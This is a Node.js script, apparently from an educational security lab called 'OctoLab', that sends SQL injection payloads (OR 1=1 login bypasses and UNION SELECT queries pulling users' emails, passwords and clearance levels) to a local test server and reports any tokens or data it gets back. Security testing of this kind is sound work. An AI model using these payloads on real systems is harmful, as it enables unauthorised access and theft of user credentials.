const axios = require('axios');

const BASE_URL = 'http://localhost:3001';

// Payloads SQL Injection
const payloads = [
  {
    name: "Bypass simple",
    email: "admin@octolab.org' OR '1'='1' --",
    password: "anything"
  },
  {
    name: "Bypass avec OR",
    email: "' OR 1=1 --",
    password: "test"
  },
  {
    name: "Union injection",
    email: "' UNION SELECT id, name, email, password, clearance_level FROM users --",
    password: "test"
  }
];

async function testAuthVulnerability() {
  console.log('🚨 TEST DES VULNÉRABILITÉS SQL INJECTION - OCTOLAB\n');
  
  for (const payload of payloads) {
    console.log(`🎯 Test: ${payload.name}`);
    console.log(`   📧 Email: ${payload.email}`);
    console.log(`   🔑 Password: ${payload.password}`);
    
    try {
      const response = await axios.post(`${BASE_URL}/api/auth/login`, {
        email: payload.email,
        password: payload.password
      }, {
        validateStatus: () => true
      });
      
      if (response.status === 200 && response.data.token) {
        console.log(`   ✅ SUCCÈS! Token obtenu: ${response.data.token.substring(0, 30)}...`);
        console.log(`   👤 Utilisateur: ${response.data.user.name} (${response.data.user.email})`);
        console.log(`   🔐 Clearance: ${response.data.user.clearanceLevel}\n`);
      } else {
        console.log(`   ❌ Échec - Status: ${response.status}`);
        console.log(`   📝 Message: ${response.data.error || response.data.message}\n`);
      }
    } catch (error) {
      console.log(`   💥 Erreur: ${error.message}\n`);
    }
    
    // Pause entre les tests
    await new Promise(resolve => setTimeout(resolve, 500));
  }
}

async function testResearchAPI() {
  console.log('🔬 TEST DE L\'API DE RECHERCHE\n');
  
  const researchPayloads = [
    "1' UNION SELECT id, title, description, classification FROM research_projects --",
    "1' UNION SELECT id, name, email, clearance_level FROM users --"
  ];
  
  for (const payload of researchPayloads) {
    console.log(`🎯 Test API: ${payload}`);
    
    try {
      const response = await axios.get(`${BASE_URL}/api/research`, {
        params: { id: payload },
        validateStatus: () => true
      });
      
      if (response.status === 200) {
        console.log(`   ✅ SUCCÈS! Données extraites:`);
        console.log(`   📊 ${JSON.stringify(response.data).substring(0, 100)}...\n`);
      } else {
        console.log(`   ❌ Échec - Status: ${response.status}\n`);
      }
    } catch (error) {
      console.log(`   💥 Erreur: ${error.message}\n`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 500));
  }
}

async function main() {
  console.log('🐙 OCTOLAB - TEST DE SÉCURITÉ');
  console.log('⚠️  USAGE ÉDUCATIF UNIQUEMENT\n');
  console.log('=' .repeat(50));
  
  await testAuthVulnerability();
  await testResearchAPI();
  
  console.log('=' .repeat(50));
  console.log('🎓 Tests terminés! Analysez les résultats et corrigez les vulnérabilités.');
}

main().catch(console.error);